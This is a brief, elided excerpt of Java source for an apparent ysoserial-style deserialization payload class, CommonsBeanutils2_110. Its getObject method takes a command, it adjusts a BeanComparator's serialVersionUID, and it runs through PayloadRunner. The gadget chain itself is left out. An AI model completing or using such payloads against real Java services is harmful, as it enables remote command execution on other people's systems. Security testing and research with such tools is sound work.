...
public class CommonsBeanutils2_110 implements ObjectPayload<Object> {
    ...
    public Object getObject(String command) throws Exception {
        ...
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = 1L;", ctBeanComparator));
    ...
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils2_110.class, args);
    }
}
